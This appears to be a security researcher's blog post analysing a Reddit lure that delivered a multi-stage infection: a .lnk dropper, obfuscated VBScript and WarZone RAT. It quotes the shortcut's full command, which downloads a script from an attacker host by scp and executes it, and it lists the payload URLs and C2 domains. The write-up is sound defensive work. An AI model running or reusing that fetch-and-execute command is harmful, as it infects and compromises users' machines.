<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> So, someone tried baiting people into downloading malware on r/cybersecurity | tweedge&#39;s blog </title> <meta name="description" content=" Are there Darwin awards for skids burning their C2 infrastructure? "> <meta name="keywords" content="malware"> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"> <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"> <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"> <link rel="manifest" href="/site.webmanifest"> <link rel="preload" href="/fonts/opensans-light.woff2" as="font" type="font/woff2" crossorigin> <link rel="preload" href="/fonts/opensans-regular.woff2" as="font" type="font/woff2" crossorigin> <link rel="preload" href="/fonts/opensans-bold.woff2" as="font" type="font/woff2" crossorigin> <link rel="preload" href="/fonts/entities.woff2" as="font" type="font/woff2" crossorigin> <a rel="me" href="https://cybersecurity.theater/@tweedge"></a> <a rel="me" href="https://proven.lol/75deff"></a> <meta property="og:type" content="article"> <meta property="article:author" content="Chris Partridge"> <meta property="article:section" content="malware"> <meta property="article:tag" content="malware"> <meta property="article:published_time" content="2023-09-30 00:00:00 +0000"> <meta property="og:url" content="https://chris.partridge.tech/2023/malware-targeting-cybersecurity-subreddit/"> <meta property="og:title" content=" So, someone tried baiting people into downloading malware on r/cybersecurity | tweedge&#39;s blog "> <meta property="og:description" content=" Are there Darwin awards for skids burning their C2 infrastructure? "> <meta property="og:image" content="https://chris.partridge.tech/images/card.png"> <meta property="og:site_name" content="Chris Partridge"> <meta property="og:locale" content="en_US"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:site" content="@_tweedge"> <meta name="twitter:title" content=" So, someone tried baiting people into downloading malware on r/cybersecurity | tweedge&#39;s blog "> <meta name="twitter:description" content=" Are there Darwin awards for skids burning their C2 infrastructure? "> <meta name="twitter:image:src" content="https://chris.partridge.tech/images/card.png"> <meta itemprop="name" content=" So, someone tried baiting people into downloading malware on r/cybersecurity | tweedge&#39;s blog "> <meta itemprop="description" content=" Are there Darwin awards for skids burning their C2 infrastructure? "> <meta itemprop="image" content="https://chris.partridge.tech/images/card.png"> <link rel="stylesheet" href="/css/main.css"> <link rel="canonical" href="https://chris.partridge.tech/2023/malware-targeting-cybersecurity-subreddit/"> <link rel="alternate" type="application/rss+xml" title="tweedge's blog" href="https://chris.partridge.tech/feed.xml"> <meta http-equiv="onion-location" content="http://tweedge32j4ib2hrj57l676twj2rwedkkkbr57xcz5z73vpkolws6vid.onion/2023/malware-targeting-cybersecurity-subreddit/" /> </head> <body> <main class="wrapper"> <header class="site-header"> <nav class="nav"> <div class="container"> <a id="flashbang-button"> <span id="flashbang-icon" class="entities-sym-sun"></span> </a> <ul class="navbar"> <li><a href="/">home</a></li> <li><a href="/about/">about</a></li> <li><a href="/research/">research</a></li> </ul> <script src="/js/flashbang.js"></script> </div> </nav> </header> <article class="post container" itemscope itemtype="http://schema.org/BlogPosting"> <header class="post-header"> <h1 class="post-title" itemprop="name headline">So, someone tried baiting people into downloading malware on r/cybersecurity</h1> <p class="post-meta"><time datetime="2023-09-30T00:00:00+00:00" itemprop="datePublished">Published Sep 30, 2023</time> â 6 mins read </p> </header> <div class="post-content" itemprop="articleBody"> <p>You know, if I was a cybercriminal, the <em>last</em> thing I would want to do is invite scrutiny to my operation. Things like â¦ posting a really obvious lure in a den of cybersecurity/IT/etc. professionals and aspirants. But maybe Iâd just be a better cybercriminal, because someone did exactly that today over on <a href="https://reddit.com/r/cybersecurity" target="_blank" rel="noopener noreferrer">r/cybersecurity</a>.</p> <h3 id="the-lure">The Lure</h3> <p>While cleaning up the usual spam/marketing/etc. on r/cybersecurity, I noticed an interesting and unexpected post, advertising a free combo list,<sup id="fnref:combo-list" role="doc-noteref"><a href="#fn:combo-list" class="footnote" rel="footnote">1</a></sup> by an unknown user âSuperdevman69â</p> <p><img src="/2023/malware-targeting-cybersecurity-subreddit/reddit-post-screenshot.png" alt="A post on Reddit advertising 300k user:pass combos for Fortnite/Runescape/VPNs etc."> <sup><a href="https://web.archive.org/web/20230930175402/https://old.reddit.com/r/cybersecurity/comments/16wcy97/account_login_leak_over_300000_runescape_vpn/" target="_blank" rel="noopener noreferrer">view on the Wayback Machine</a><sup></sup></sup></p> <p>Apparently âSuperdevman69â is generously distributing free resources by an encrypted zip archive off Mediafire. The compression makes sense - text data compresses easily - but encrypting this is suspicious. Your file host is going to damn well know what youâre hosting if you publish a public link and description of what it is.</p> <p>But hey, how nice! They included an <a href="https://web.archive.org/web/20230930213505/https://avcheck.net/id/ep1wFUHTd4M3" target="_blank" rel="noopener noreferrer">avcheck.net link</a> showing that the file is most definitely clean. Of course it doesnât <em>mean</em> anything, because antimalware programs wonât try to decrypt the encrypted ZIP container, but to inexperienced folks itâll <em>look like it means something</em> and thatâs what matters. This is a security usability <del>bug</del> feature that VirusTotal has too (which labeled this file as âNo security vendors and no sandboxes flagged this file as maliciousâ).<sup id="fnref:virustotal-encrypted-zips" role="doc-noteref"><a href="#fn:virustotal-encrypted-zips" class="footnote" rel="footnote">2</a></sup></p> <p>Clicking through, we see this is a recent file with a total size of 1.66 <em>kilobytes</em> - far too small to contain 300,000 usernames and passwords.</p> <p><img src="/2023/malware-targeting-cybersecurity-subreddit/mediafire-screenshot.png" alt="A Mediafire download link for a password protected zip that's under a kilobyte."> <sup><a href="https://web.archive.org/web/20230930175739/https://www.mediafire.com/file/2wgtmt1v7wfe25n/Account_Database_Password_123.zip/file" target="_blank" rel="noopener noreferrer">view on the Wayback Machine</a><sup></sup></sup></p> <p>But us? We <em>really</em> want that fabled combo list. Letâs download.</p> <h3 id="the-malware">The Malware</h3> <h4 id="stage-1-dropper-lnk-in-encrypted-zip">Stage 1: Dropper (.lnk in encrypted .zip)</h4> <p>Downloading the zip file (<a href="https://www.virustotal.com/gui/file/99c37d4005e5c7ca44ce5f46e6ae0c0662c371eeb250849f2faebe1e42c4f4a0/detection" target="_blank" rel="noopener noreferrer">VT</a>, <a href="https://malshare.com/sample.php?action=detail&amp;hash=99c37d4005e5c7ca44ce5f46e6ae0c0662c371eeb250849f2faebe1e42c4f4a0" target="_blank" rel="noopener noreferrer">MalShare</a>) and extracting it with trhe super-safe password <code class="language-plaintext highlighter-rouge">123</code>, we receive:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Account Database Password 123
âââ AccountListUsernameandPass.lnk
âââ Fortnight accounts.rtf
âââ VPN accounts.rtf
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">Fortnight accounts.rtf</code> and <code class="language-plaintext highlighter-rouge">VPN accounts.rtf</code> are both ~empty Rich Text files and contain nothing of interest. <code class="language-plaintext highlighter-rouge">AccountListUsernameandPass.lnk</code> is where the meat is - this is a Windows Shortcut file. Hopefully anyone who hadnât realized the ruse by now is suspicious enough to double-check or delete this. But if anyone does click, this link runs:</p> <p><code class="language-plaintext highlighter-rouge">..\..\..\..\..\..\Windows\system32\cmd.exe /c "scp -o StrictHostKeyChecking=no bd@hta4lyfeohyea.duckdns.org:/bd/BRFQ %APPDATA%\uey.vbs" &amp; %APPDATA%\uey.vbs</code></p> <p>Or in English:</p> <ul> <li>The âlinkâ being opened is actually starting up a command prompt on their local machine<sup id="fnref:lnk" role="doc-noteref"><a href="#fn:lnk" class="footnote" rel="footnote">3</a></sup>
</li> <li>Their system connects to <code class="language-plaintext highlighter-rouge">hta4lyfeohyea.duckdns.org</code> using SSH, logging in as user <code class="language-plaintext highlighter-rouge">bd</code>, and downloading the remote file <code class="language-plaintext highlighter-rouge">/bd/BRFQ</code> to be saved locally as <code class="language-plaintext highlighter-rouge">%APPDATA%\uey.vbs</code>
</li> <li>Then executes <code class="language-plaintext highlighter-rouge">%APPDATA%\uey.vbs</code>
</li> </ul> <h4 id="stage-2-another-dropper-vbs">Stage 2: Another Dropper (.vbs)</h4> <p><code class="language-plaintext highlighter-rouge">%APPDATA%\uey.vbs</code> (<a href="https://www.virustotal.com/gui/file/9edca23169d5993d4741088d4615576995edcb96b6ec2614ada0feb8792e3d75/detection" target="_blank" rel="noopener noreferrer">VT</a>, <a href="https://malshare.com/sample.php?action=detail&amp;hash=9edca23169d5993d4741088d4615576995edcb96b6ec2614ada0feb8792e3d75" target="_blank" rel="noopener noreferrer">MalShare</a>) is an obfuscated VBScript file:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Function DcEgSmpKzlbeYfUTbj()
Dim CQcHcIAXujchhbktqZp
CQcHcIAXujchhbktqZp = "eQnAos"
Dim QlDkaxZajxRzwueO
QlDkaxZajxRzwueO = "HVdpV"
Dim hLsyUqLXIglFDYkorIq
hLsyUqLXIglFDYkorIq = 49943
DcEgSmpKzlbeYfUTbj = "emklad"
End Function
Function CvSuaLKenrefTlUEOi()
Dim pysiTqrHaAddkqbe
... (continues for another 2,059 lines)
</code></pre></div></div> <p>And I <em>could</em> go to the length of deobfuscating it, but honestly, itâs been a long week and Iâm not expecting for this to be especially novel or complex based on the attack sophistication so far. Instead, I threw this into <a href="https://any.run/report/9edca23169d5993d4741088d4615576995edcb96b6ec2614ada0feb8792e3d75/68c5297b-cad9-480a-9979-52ad78b3cbaa" target="_blank" rel="noopener noreferrer">any.run</a> and executed it to see what would happen. Immediately, the VBScript file made two downloads from <code class="language-plaintext highlighter-rouge">www.freecryptorobot.com</code>:</p> <ul> <li>
<code class="language-plaintext highlighter-rouge">https://www.freecryptorobot.com/Release/75K_EMAIL_USERPASS.rtf</code> was saved to <code class="language-plaintext highlighter-rouge">%AppData%\Roaming\75K_EMAIL_USERPASS.rtf</code>
</li> <li>
<code class="language-plaintext highlighter-rouge">https://www.freecryptorobot.com/Release/Cache.exe</code> was saved to <code class="language-plaintext highlighter-rouge">%AppData%\Roaming\Cache.exe</code>
</li> </ul> <p>After which, it opened both, which brings us to the final stage of the infection â¦</p> <h4 id="stage-3-75k-combos-with-a-side-of-warzone-rat">Stage 3: 75k combos with a side of WarZone RAT</h4> <p>The first file, <code class="language-plaintext highlighter-rouge">75K_EMAIL_USERPASS.rtf</code> is a legitimate (if unremarkable) combo list! This is opened with Word automatically, so yay!</p> <p><img src="/2023/malware-targeting-cybersecurity-subreddit/success_maybe.jpeg" alt="Microsoft Word opening with a combo list that the malware was kind enough to download."></p> <p>But in the background, <code class="language-plaintext highlighter-rouge">Cache.exe</code> (<a href="https://www.virustotal.com/gui/file/86c94e5f96b047700f26f29d0f0ecf7bc76c78883c859e4d26fe4f3e3e00e7ad/detection" target="_blank" rel="noopener noreferrer">VT</a>, <a href="https://malshare.com/sample.php?action=detail&amp;hash=86c94e5f96b047700f26f29d0f0ecf7bc76c78883c859e4d26fe4f3e3e00e7ad" target="_blank" rel="noopener noreferrer">MalShare</a>) is âWarZoneâ/âAve Mariaâ RAT (<a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria" target="_blank" rel="noopener noreferrer">Malpedia</a>, <a href="https://attack.mitre.org/software/S0670/" target="_blank" rel="noopener noreferrer">ATT&amp;CK</a>) - a well-documented piece of malware-as-a-service offered for cheap to online miscreants. Its pricing is particularly attractive for low-level threats and âscript kiddiesâ - allowing people to buy a full-featured RAT for as low as $16/mo (with a committed use discount).</p> <p><img src="/2023/malware-targeting-cybersecurity-subreddit/process_tree.png" alt="Process tree of cache.exe"> <sup><a href="https://any.run/report/9edca23169d5993d4741088d4615576995edcb96b6ec2614ada0feb8792e3d75/68c5297b-cad9-480a-9979-52ad78b3cbaa#Process" target="_blank" rel="noopener noreferrer">view full process tree in any.run report</a><sup></sup></sup></p> <p>I wonât dig into WarZone RAT as there are other, <a href="https://muha2xmad.github.io/malware-analysis/warzonerat/" target="_blank" rel="noopener noreferrer">better writeups</a>, but notably the C2 servers that this was configured to use were:</p> <ul> <li>
<code class="language-plaintext highlighter-rouge">Superherocan.mywire.org:5200</code> (at time of writing, currently resolves to <code class="language-plaintext highlighter-rouge">185.225.74.106</code>)</li> <li>
<code class="language-plaintext highlighter-rouge">SuperGuy.camdvr.org:6000</code> (at time of writing, currently resolves to <code class="language-plaintext highlighter-rouge">95.214.27.6</code>)</li> </ul> <p>These are pretty obviously suspicious, and â¦ are they <em>themeing their C2 infrastructure with their preferred username?</em> Incredible. It might be fun to pull on this thread and find more infrastructure associated with this person. But thatâs another post, and proper attribution (beyond assumption) is always a can of worms.</p> <h3 id="conclusion">Conclusion</h3> <p>To Redditâs credit, they banned the âSuperdevman69â account within minutes - this may have been a spray-and-pray attack on multiple subreddits which triggered their spam filter, or they may have seen similarly-worded malicious posts in the past. The attackerâs Mediafire appears to have been banned, and Iâll submit abuse reports to relevant hosting providers.</p> <p>As a r/cybersecurity moderator, weâre vigilant for possible attacks or nefarious behavior, but weâre not omnipresent. Itâs good to remember that content on social media sites canât be trusted by default, and even cybersecurity professionals can be duped. Maybe not by this <em>particular</em> attack but yâknow â¦ in higher-effort situations, maybe.</p> <p>While I donât recall any sophisticated watering hole attacks against tech staff, itâs probably only a matter of time. Weâll be on the lookout.</p> <h3 id="aggregated-iocs">Aggregated IOCs</h3> <ul> <li><a href="/2023/malware-targeting-cybersecurity-subreddit/domains.txt">All domains mentioned in this post</a></li> <li><a href="/2023/malware-targeting-cybersecurity-subreddit/sha256.txt">SHA256 for all files mentioned in this post</a></li> </ul> <h3 id="authors-notes">Authorâs Notes</h3> <div class="footnotes" role="doc-endnotes"> <ol> <li id="fn:combo-list" role="doc-endnote"> <p>âComboâ (combination of usernames and passwords) lists often circulate on hacking forums and are used for account takeover attacks, targeting users via password reuse or bruteforce attacks.Â <a href="#fnref:combo-list" class="reversefootnote" role="doc-backlink">â©</a></p> </li> <li id="fn:virustotal-encrypted-zips" role="doc-endnote"> <p>Itâs ridiculous that real industry tools like VirusTotal also donât highlight the use of encrypted zip files as suspect-by-default. Itâs a disservice to consumers who rely on VT results to sanity check âshould I be suspicious right now.â Yes, they damn well should, and adding two lines explaining âhey this is an encrypted zip file, malware scanners donât scan in these, lolâ would be trivial. Apparently as an industry we bend the knee to marketing instead. <a href="https://cybersecurity.theater/@tweedge/111155671827013125" target="_blank" rel="noopener noreferrer">Rant continues</a>.Â <a href="#fnref:virustotal-encrypted-zips" class="reversefootnote" role="doc-backlink">â©</a></p> </li> <li id="fn:lnk" role="doc-endnote"> <p>Will cybersecurity be replaced by AI, they ask me. Given weâre still unrolling terrible decisions made in <a href="https://en.wikipedia.org/wiki/Shortcut_(computing)#Microsoft_Windows" target="_blank" rel="noopener noreferrer">1995</a> (and making new bad decisions by the day) â¦ no.Â <a href="#fnref:lnk" class="reversefootnote" role="doc-backlink">â©</a></p> </li> </ol> </div> </div> </article> <section class="post-list"> <div class="container"> <h3>Related Posts</h3> <article class="post-item"> <p> <span class="post-meta">Dec 14, 2022</span> â <strong><a class="post-link" href="/2022/evolution-of-vipersoftx-dga/">50 Domains Worth Blocking: The Evolution of ViperSoftX's Underreported DGA</a></strong> <br> <span>ViperSoftX is a multi-stage cryptocurrency stealer which is spread within torrents and filesharing sites, responsible for stealing hundreds of thousands of dollar-equivalent funds, mostly from individual users. Nearly three years after it was originally discovered, this malware campaign has more surprises in store, and I'm digging into its dropper/C2 ops. The first article of a series.</span> <a class="post-link readmore" href="/2022/evolution-of-vipersoftx-dga/">Read more</a></p> </article> <article class="post-item"> <p> <span class="post-meta">Oct 20, 2020</span> â <strong><a class="post-link" href="/2020/extensions-the-next-generation-of-malware/help-for-users/">Help for Users Impacted by Infected Extensions</a></strong> <br> <span>If 'User-Agent Switcher', 'Nano Adblocker', or 'Nano Defender' sound familiar to you, I might have some bad news. A malware operator I am investigating has escalated their operations and infected 350k+ users; here's what happened and what to do if you were one of them.</span> <a class="post-link readmore" href="/2020/extensions-the-next-generation-of-malware/help-for-users/">Read more</a></p> </article> <article class="post-item"> <p> <span class="post-meta">Sep 27, 2020</span> â <strong><a class="post-link" href="/2020/email-fraud-or-email-compromise-beginners-guide/">Email Fraud or Email Compromise: A Beginner's Guide</a></strong> <br> <span>A student-friendly post about email, collecting evidence, forming hypotheses, and responding to a real-world incident with imperfect information. Batteries, references, and source materials included.</span> <a class="post-link readmore" href="/2020/email-fraud-or-email-compromise-beginners-guide/">Read more</a></p> </article> <h5>Want more? Go back to the <a href="/">index</a>!</h5> </div> </section> <footer class="site-footer"> <div class="container"> <small class="pull-left">Â© Chris Partridge 2024</small> <small class="pull-right"><a href="https://chris.partridge.tech/feed.xml" target="_blank">RSS</a></small> <br> <small class="pull-left">This page is also available anonymously <a href="http://tweedge32j4ib2hrj57l676twj2rwedkkkbr57xcz5z73vpkolws6vid.onion/2023/malware-targeting-cybersecurity-subreddit/" target="_blank" rel="noopener noreferrer">via Tor</a>.</small> <br> <small class="pull-left">This site is <a href="https://chris.partridge.tech/license/CC_BY-NC-SA_4.0_International.txt" target="_blank">licensed</a> under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.</small> </div> </footer> </main> </body> </html>